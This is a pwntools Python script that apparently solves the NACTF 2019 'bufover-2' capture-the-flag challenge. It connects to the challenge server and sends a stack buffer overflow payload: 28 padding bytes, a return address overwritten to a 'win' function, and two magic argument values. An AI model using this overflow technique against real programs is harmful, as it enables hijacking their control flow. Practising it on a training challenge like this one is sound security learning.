#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

local = False
elf = 'bufover-2' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "shell.2019.nactf.com"
    port = 31184
    r = remote(ip,port)

context.arch = 'i386'

win = 0x080491c2
raw_input("aaa")
payload = 'a' * 28 + p32(win)+ p32(0x0) + p32(0x14B4DA55) + p32(0x00000000) + p32(0xF00DB4BE)
r.sendline(payload)
r.interactive()
